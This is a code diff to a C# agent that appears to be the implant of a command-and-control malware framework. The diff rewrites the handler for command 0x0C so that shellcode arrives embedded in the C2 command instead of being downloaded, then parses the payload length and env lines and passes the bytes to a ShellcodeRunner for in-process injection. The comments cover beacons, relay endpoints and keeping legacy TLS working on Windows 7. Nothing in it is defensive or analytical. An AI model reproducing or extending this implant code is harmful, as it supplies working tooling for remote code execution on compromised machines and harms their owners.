@@ -33,8 +33,8 @@ namespace CSharpAgent
             // handover reported a FALSE success. With |= Win10/11 still negotiate 1.2 while
             // Win7 keeps its legacy protocols — the relay edge accepts TLS 1.0 (the JScript
             // agent's own beacons ride it). The int-cast form works on CLR 2.0 where
-            // SecurityProtocolType.Tls12 doesn't exist (same trick C2Payload uses for the
-            // A_URL download); stacks that reject the value throw — swallowed.
+            // SecurityProtocolType.Tls12 doesn't exist; stacks that reject the value
+            // throw — swallowed.
             try
             {
                 ServicePointManager.SecurityProtocol |= (SecurityProtocolType)3072;
@@ -207,15 +207,26 @@ namespace CSharpAgent
             }
             if (command[0] == 12)
             {
-                // Payload after the corrId: ASCII `NAME=value` env lines (the same env-line
-                // style the 0x0B headers use). A_URL names the URL we download the PIC agent
-                // bytes from at runtime (C2Payload.Data — the bytes never ride the command);
-                // W_URL is the relay the injected WebSocket agent reads from the process env.
-                // We stay resident afterwards: the injected agent runs in THIS process, so
+                // Payload after the corrId: [binLen:u32le][PIC binary][ASCII `NAME=value` env
+                // lines] (the same env-line style the 0x0B headers use). The PIC bytes RIDE THE
+                // COMMAND — the C2 fetched them browser-side and embedded them, so there is no
+                // runtime download and no A_URL anywhere; W_URL (the relay the injected
+                // WebSocket agent reads from the process env) is the only current env var. We
+                // stay resident afterwards: the injected agent runs in THIS process, so
                 // exiting would kill it too.
                 try
                 {
-                    var start = 5;
+                    var binLen = command.Length >= 9 ? BitConverter.ToInt32(command, 5) : 0;
+                    if (binLen <= 0 || 9 + binLen > command.Length)
+                    {
+#if DEBUG
+                        Diag.Show("[exit] 0x0C", "bad or missing payload length — replying status 1 (nothing to inject)");
+#endif
+                        return Reply(1, corrId); // no/short payload ⇒ nothing to inject
+                    }
+                    var payload = new byte[binLen];
+                    Array.Copy(command, 9, payload, 0, binLen);
+                    var start = 9 + binLen;
                     while (start < command.Length)
                     {
                         var nl = Array.IndexOf(command, (byte)'\n', start);
@@ -229,20 +240,7 @@ namespace CSharpAgent
                         start = nl + 1;
                     }
 #if DEBUG
-                    var aUrl = Environment.GetEnvironmentVariable("A_URL");
-                    Diag.Show("[0x0C] env", "env lines applied — A_URL = " +
-                        (string.IsNullOrEmpty(aUrl) ? "<not set>" : aUrl));
-#endif
-                    var payload = C2Payload.Data;
-                    if (payload.Length == 0)
-                    {
-#if DEBUG
-                        Diag.Show("[exit] 0x0C", "no A_URL / empty payload — replying status 1 (nothing to inject)");
-#endif
-                        return Reply(1, corrId); // no A_URL ⇒ nothing to inject
-                    }
-#if DEBUG
-                    Diag.Show("[0x0C] inject", "payload " + payload.Length + " bytes downloaded — calling ShellcodeRunner.RunPayload");
+                    Diag.Show("[0x0C] inject", "payload " + payload.Length + " bytes taken from the command — calling ShellcodeRunner.RunPayload");
 #endif
                     ShellcodeRunner.RunPayload(payload);
 #if DEBUG
